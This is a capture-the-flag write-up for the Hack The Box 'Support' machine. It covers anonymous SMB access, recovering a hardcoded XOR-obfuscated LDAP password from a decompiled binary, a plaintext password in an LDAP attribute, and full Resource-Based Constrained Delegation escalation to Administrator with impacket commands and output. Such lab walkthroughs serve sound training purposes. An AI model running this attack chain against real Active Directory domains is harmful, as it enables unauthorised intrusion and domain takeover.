# Support
#HTB #Active-Directory #RBCD #easy #evil-winrm #reverse-shell #networks-services #privilege-escalation #guided-mode #remote-access #SMB 
## Target:
*Name:* Support

*IP:* 10.129.87.68
## Vulnerability:
- Anonymous login was enabled on SMB, allowing access to resources containing sensitive information.
- Hardcoded LDAP credentials embedded on a binary executable and weak exposed encryption algorithm.
- Password storage in plain text in the LDAP `info` attribute.
- Low privilege user was allowed to create machines on the AD via the `SeMachineAccountPrivilege` setting.
- `support` user had write permissions to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, allowing Resource-Based Constrained Delegation (RBCD) to be configured against the DC, which led to a service ticket via Kerberos for the `Administrator` account.
## Steps:
#### 1) Reconnaissance
**Code:**
```
nmap -sV 10.129.87.68
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-26 06:49 -0400
Nmap scan report for 10.129.87.68
Host is up (0.018s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-26 10:51:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds

```

**Nmap result breakdown:**

| Port | Service                 | Description                                                                               |
| ---- | ----------------------- | ----------------------------------------------------------------------------------------- |
| 53   | DNS                     | Resolves domain names and is essential for Active Directory.                              |
| 88   | Kerberos                | Handles authentication and ticket-based access in Active Directory.                       |
| 135  | MSRPC                   | Windows RPC endpoint mapper used by various Windows services.                             |
| 139  | NetBIOS                 | Legacy Windows file and printer sharing.                                                  |
| 389  | LDAP                    | Used to query and interact with Active Directory information.                             |
| 445  | SMB                     | Windows file sharing and network communication.                                           |
| 464  | Kerberos                | Used for Kerberos password changes and related operations.                                |
| 593  | RPC over HTTP           | Allows Windows RPC communication over HTTP.                                               |
| 636  | LDAPS                   | Encrypted LDAP communication over TLS.                                                    |
| 3268 | Global Catalog          | Provides LDAP access to the Active Directory Global Catalog.                              |
| 3269 | Global Catalog over TLS | Encrypted version of the Global Catalog service.                                          |
| 5985 | WinRM                   | Windows Remote Management; can be used for remote administration and PowerShell sessions. |
#### 2) Connected to an SMB share on the target
We started by enumerating available SMB shares on the target machine:

**Code:**
```
smbclient -L //10.129.87.68 -N
```

**Result:**
```

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.87.68 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We identified several standard Windows/Active Directory shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`), as well as a custom `support-tools` share that warranted further investigation.

**Code:**
```
smbclient //10.129.87.68/support-tools -N
```
**Result:**
```
smb: \>
```
We successfully connected to `support-tools` SMB share.

Next, we listed available files on that share:
```
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022
```
The `support-tools` share contained several common administrative utilities, as well as a custom `UserInfo.exe.zip` executable. We downloaded and analyzed this executable because custom tools can contain useful information such as hardcoded credentials, LDAP queries, or other sensitive configuration.
#### 3) Analyzing UserInfo.exe
We used `ILSpy` tool to analyze the executable's source code. We found the following functions:
```C#
public LdapQuery(){
	string password = Protected.getPassword();
	entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
	entry.set_AuthenticationType((AuthenticationTypes)1);
	ds = new DirectorySearcher(entry);
}
```
This function shows that the value returned by `Protected.getPassword()` is used as the password to authenticate to the `support.htb` LDAP server with the `support\ldap` account.
We'll investigate the `Protected.getPassword()` function:
```C#
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
	byte[] array = Convert.FromBase64String(enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
	}
	return Encoding.Default.GetString(array2);
}
```

The function decrypts the password by XORing the encrypted data with the key `armando` and the hexadecimal value `0xDF`.
We'll use the same steps on CyberChef to retrieve the original password.

<img width="1963" height="1058" alt="image" src="https://github.com/user-attachments/assets/dc984451-cee2-4bdd-9443-83b38376c99b" />

**Result:**
```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

#### 4) Enumerating users on the target machine
We used `ldapsearch` to list available users on the target machine's Active Directory:
```
ldapsearch -x -H ldap://support.htb \
-D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'DC=support,DC=htb' \     
'(&(objectCategory=person)(objectClass=user))' \
sAMAccountName
```

**Result:**
```
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (&(objectCategory=person)(objectClass=user))
# requesting: sAMAccountName 
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
sAMAccountName: Administrator

# Guest, Users, support.htb
dn: CN=Guest,CN=Users,DC=support,DC=htb
sAMAccountName: Guest

# krbtgt, Users, support.htb
dn: CN=krbtgt,CN=Users,DC=support,DC=htb
sAMAccountName: krbtgt

# ldap, Users, support.htb
dn: CN=ldap,CN=Users,DC=support,DC=htb
sAMAccountName: ldap

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
sAMAccountName: support

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
sAMAccountName: smith.rosario

# hernandez.stanley, Users, support.htb
dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
sAMAccountName: hernandez.stanley

# wilson.shelby, Users, support.htb
dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
sAMAccountName: wilson.shelby

# anderson.damian, Users, support.htb
dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
sAMAccountName: anderson.damian

# thomas.raphael, Users, support.htb
dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
sAMAccountName: thomas.raphael

# levine.leopoldo, Users, support.htb
dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
sAMAccountName: levine.leopoldo

# raven.clifton, Users, support.htb
dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
sAMAccountName: raven.clifton

# bardot.mary, Users, support.htb
dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
sAMAccountName: bardot.mary

# cromwell.gerard, Users, support.htb
dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
sAMAccountName: cromwell.gerard

# monroe.david, Users, support.htb
dn: CN=monroe.david,CN=Users,DC=support,DC=htb
sAMAccountName: monroe.david

# west.laura, Users, support.htb
dn: CN=west.laura,CN=Users,DC=support,DC=htb
sAMAccountName: west.laura

# langley.lucy, Users, support.htb
dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
sAMAccountName: langley.lucy

# daughtler.mabel, Users, support.htb
dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
sAMAccountName: daughtler.mabel

# stoll.rachelle, Users, support.htb
dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
sAMAccountName: stoll.rachelle

# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
sAMAccountName: ford.victoria

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 24
# numEntries: 20
# numReferences: 3
```

We checked multiple users information. `support` user had an additionnal information (`info`) that other users didn't have.
```
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (&(objectCategory=person)(sAMAccountName=support))
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 1
codePage: 0
countryCode: 0
badPasswordTime: 134322427018527302
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

It might be the password for that account. So tried to use it to authenticate using `evil-winrm`:
```
evil-winrm -i support.htb -u "support" -p "Ironside47pleasure40Watchful"
```
**Result:**
```
*Evil-WinRM* PS C:\Users\support\Documents>
```

We searched for the `user.txt` flag:
```
*Evil-WinRM* PS C:\Users\support\Desktop> ls


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/26/2026   3:44 AM             34 user.txt


*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
<USER_FLAG>
```

#### 5) Privilege escalation
We started by checking the privileges `support` user had:

**Code:**
```
whoami /all
```
**Result:**
```
USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled
```
The important part is: 
```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```
It means `support` user is allowed to create computer accounts in the domain.

For further investigation, we checked if the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute is configured on the target machine:
```
Get-ADComputer DC -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```
**Result:**
```
msDS-AllowedToActOnBehalfOfOtherIdentity : System.DirectoryServices.ActiveDirectorySecurity
```
which meant Resource-Based Constrained Delegation (RBCD) was a valid attack path we could attempt.

Next, we returned to our kali machine to start the attack using `impacket`.

**First step:**
We created a new computer `PC$` using `impacket-addcomputer`: 
```
impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -computer-name 'PC$' 
```
**Result:**
```
[*] Successfully added machine account PC$ with password zAUIhdDQBExlScPRasaEM56Hv5hwbJTQ.
```

> [!NOTE]
> `PC$` ends with a $ because in Active Directory, a computer account's `sAMAccountName` normally ends with `$`.

**Second step:**
We need to configure Domain Controller (`DC$`) to trust `PC01$`. To do so we'll use the following command:
```
impacket-rbcd -delegate-from 'PC$' -delegate-to 'DC$' -action 'write' support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.129.87.68
```
**Result:**
```

[*] Delegation rights modified successfully!
[*] PC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     PC$          (S-1-5-21-1677581083-3380853377-188903654-6102)
```

**Third step:**
Now, we can request `Kerberos` for a ticket to `DC$` while impersonating `Administrator`:
```
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator support.htb/'PC$':'zAUIhdDQBExlScPRasaEM56Hv5hwbJTQ' -dc-ip 10.129.87.68
```
the ticket is for the service (`CIFS` on `DC$`), while the identity represented by the ticket is `Administrator`.
**Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**Final step:**
Finally, we'll use the ticket we obtained from `Kerberos`:
```
$ export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
$ impacket-wmiexec -k -no-pass Administrator@dc.support.htb -dc-ip 10.129.87.68
```
**Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

> [!NOTE] 
> `export` is used to set an environment variable in the current shell session.
> 
> In our case, it tells Kerberos/Impacket:
>
> **"Use this `.ccache` file as my Kerberos credential cache."**
>
So afterward, commands using Kerberos (`-k`) know which ticket to use.

> [!NOTE]
> Why did it work?
> We configured AD so that `DC$` trusts `PC$` for delegation → Kerberos uses that AD configuration → Kerberos gives `PC$` the service ticket representing Administrator → `DC$` accepts that ticket.

We checked our identity:
```
C:\>whoami
support\administrator
```
We successfully connect to the target machine as `Administrator`, and we'll procced to retrieve the flag:
```
C:\>cd Users/Administrator
C:\Users\Administrator>dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator

05/28/2022  04:11 AM    <DIR>          .
07/26/2022  06:21 AM    <DIR>          ..
05/28/2022  04:11 AM    <DIR>          .ansible_async
05/19/2022  02:13 AM    <DIR>          3D Objects
05/19/2022  02:13 AM    <DIR>          Contacts
05/28/2022  04:17 AM    <DIR>          Desktop
01/18/2024  06:27 AM    <DIR>          Documents
05/19/2022  02:13 AM    <DIR>          Downloads
05/19/2022  02:13 AM    <DIR>          Favorites
05/19/2022  02:13 AM    <DIR>          Links
05/19/2022  02:13 AM    <DIR>          Music
05/19/2022  02:13 AM    <DIR>          Pictures
05/19/2022  02:13 AM    <DIR>          Saved Games
05/19/2022  02:13 AM    <DIR>          Searches
05/19/2022  02:13 AM    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)   3,958,095,872 bytes free

C:\Users\Administrator>cd Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
08/27/2026  07:47 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,958,099,968 bytes free

C:\Users\Administrator\Desktop>type root.txt
<ROOT_FLAG>
```

> [!NOTE]
> ## Resource-Based Constrained Delegation (RBCD)
>
>**RBCD (Resource-Based Constrained Delegation)** is an Active Directory mechanism that allows a computer or service account to **act on behalf**
> **of another user when accessing a specific target computer/service**.
>
>The configuration is stored on the **target computer** in the following attribute:
>
>```
>msDS-AllowedToActOnBehalfOfOtherIdentity
>```
>
>### How it works
>
For example, in our case:
>
>```
>PC$  ───────────────►  DC$
>      trusted to act
>      on behalf of users
>```
>
The `DC$` computer object contains:
>
>```
>msDS-AllowedToActOnBehalfOfOtherIdentity
>        │
>        └── PC$
>```
>
>This means:
>
> `PC$` is trusted to act on behalf of users when accessing `DC$`.
>
The attacker controls `PC$`, so they can use **Kerberos S4U** mechanisms to request a service ticket representing another user, such as `Administrator`.
>
The process is:
>
>```
>Attacker
>   │
>   │ controls
>   ▼
>  PC$
>   │
>   │ RBCD permission
>   ▼
>  DC$
>   │
>   │ S4U2Self / S4U2Proxy
>   ▼
> Administrator
>   │
>   │ Kerberos service ticket
>   ▼
>Access to DC$
>```
> So we use Kerberos S4U to obtain a service ticket saying, effectively:
>
>```
>"I am accessing CIFS on DC$ as Administrator."
>```
>
> Then `DC$` verifies the Kerberos ticket.

## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Custom binary executables may contain hardcoded sensitive information.
- Active Directory object attributes (e.g. `info`, `description`) can also be used to store credentials.
- RBCD abuse is a powerful, quiet privilege escalation path that requires no password cracking or exploits
